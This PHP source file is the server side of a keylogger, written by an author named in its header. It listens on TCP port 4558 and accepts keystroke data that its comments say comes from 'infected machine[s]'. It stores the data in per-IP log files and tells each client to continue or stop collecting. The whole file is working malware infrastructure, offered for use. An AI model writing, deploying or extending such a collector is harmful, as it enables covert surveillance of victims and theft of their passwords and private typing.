<?php
/**
 *  @author DeKyll <d3kyll@gmail.com>
 */

declare(ticks = 1);

pcntl_signal(SIGUSR1, 'handle_stop_collecting');
pcntl_signal(SIGINT, 'handle_exit_all');

// Listening to requests on localhost port 4558
$host = "0.0.0.0";
$port = 4558;

$stop = "continue";
$socket = NULL;
$terminate = FALSE;

function handle_stop_collecting(){
    if($GLOBALS["stop"] == "continue"){
        $GLOBALS["stop"] = "end";
    }
}

function handle_exit_all(){
    if($GLOBALS["stop"] == "end"){
    	$GLOBALS["terminate"] = TRUE;
    }
}

// resolves whether two given dates have a difference larger than 5 seconds
function calculate_write_line($last_line, $input){
	$previous_log_string_date = substr($last_line, 0, strpos($last_line, '>')-1);
	$input_string_date = substr($input, 0, strpos($input, '>')-1);

	$previous_log_date = new DateTime($previous_log_string_date);
	$input_date = new DateTime($input_string_date);

	if($input_date->getTimestamp() - $previous_log_date->getTimestamp() > 5){
		return TRUE;
	}else{
		return FALSE;
	}
}

// handles connection and saves received data from infected machine
function handle_connection($client_address, $spawn){

	// creates log folder if it does not exist already or if it was deleted
	if(!file_exists('logs/' . $client_address)){
		mkdir('logs/' . $client_address, 0755, true);
	}
	// open received host log file
	$myfile = fopen("logs/" . $client_address . "/keylogger_" . $client_address . ".txt", "a") or die("Unable to open file\n");
	$myfile_sorted = fopen("logs/" . $client_address . "/keylogger_sorted_" . $client_address . ".txt", "a") or die("Unable to open file\n");
	if(file_exists("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt")){
		$myfile_last_message = fopen("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt", "r") or die("Unable to open file\n");
	}else{
		$myfile_last_message = fopen("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt", "w") or die("Unable to open file\n");
	}

	// read client input
	$input = socket_read($spawn, 1024) or die("Could not read input\n");

	// clear cache to avoid filesize issues
	clearstatcache();

	if(filesize("logs/" . $client_address . "/keylogger_" . $client_address . ".txt") != 0){
		// gets current machine previous log to check whether write in the actual line or next line the input received
		$last_message = fgets($myfile_last_message);
		$next_line = calculate_write_line($last_message, $input);

		if($next_line == TRUE){
			fwrite($myfile_sorted, "\n" . $input);
		}else{
			$message_cropped = substr($input, strpos($input, '>')+1, strlen($input)-1);
			fwrite($myfile_sorted, $message_cropped);
		}
	}else{
		fwrite($myfile_sorted, $input);
	}

	fclose($myfile_last_message);
	$myfile_last_message = fopen("logs/" . $client_address . "/keylogger_last_message_" . $client_address . ".txt", "w") or die("Unable to open file\n");

	//saves infected machine reported data
	fwrite($myfile, $input . "\n");
	fwrite($myfile_last_message, $input);

	//closes files
	fclose($myfile_last_message);
	fclose($myfile);
	fclose($myfile_sorted);
}

function startup(){
	if (!extension_loaded('sockets')) {
		die('The sockets extension is not loaded.');
	}

	// creates log folder if it does not exist already or if it was deleted
	if(!file_exists('logs')){
		mkdir('logs', 0755, true);
	}

	// Not timeout
	set_time_limit(0);

	// create socket
	$GLOBALS["socket"] = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
	// sets 1 second of timeout for the socket accepting connections(sending and receiving)
	socket_set_option($GLOBALS["socket"], SOL_SOCKET, SO_RCVTIMEO, array('sec' => 1, 'usec' => 0));
	socket_set_option($GLOBALS["socket"], SOL_SOCKET, SO_SNDTIMEO, array('sec' => 1, 'usec' => 0));
	// binds socket to a port in the local machine
	$result = socket_bind($GLOBALS["socket"], $GLOBALS["host"], $GLOBALS["port"]) or die("Could not bind to socket\n");
	// start listening for connections
	$result = socket_listen($GLOBALS["socket"], 3) or die("Could not set up socket listener\n");	

	while($GLOBALS["terminate"] === FALSE){
		// spawn another socket to handle next communication
		$spawn = @socket_accept($GLOBALS["socket"]);
		if($spawn !== FALSE){
			// gets client IP address and Port
			socket_getpeername($spawn, $client_address, $client_port);

			handle_connection($client_address, $spawn);

			// sends to client a message to continue or stop collecting data
			$output = $GLOBALS["stop"];
			$output = strval(strlen($output)) . "#" . $output . "#";
			socket_write($spawn, $output, strlen($output)) or die("Could not write output\n");

			// close actual connection socket
			socket_close($spawn);
		}
	}

	socket_close($GLOBALS["socket"]);
}

startup();
?>
